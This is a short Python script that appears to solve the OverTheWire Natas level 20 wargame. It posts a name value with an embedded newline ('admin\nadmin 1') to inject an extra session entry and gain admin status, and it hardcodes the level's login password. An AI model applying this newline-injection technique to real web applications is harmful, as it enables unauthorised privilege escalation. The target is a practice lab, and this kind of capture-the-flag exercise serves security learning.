import requests
from string import *


username = "natas20"
password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"
url = f"http://{username}.natas.labs.overthewire.org/?debug=true"


session = requests.Session()
response = session.post(url, auth=(username, password), data={"name": "admin\nadmin 1"})
print(response.text)
print("Status code:", response.status_code)
response = session.get(url, auth=(username, password))
print(response.text)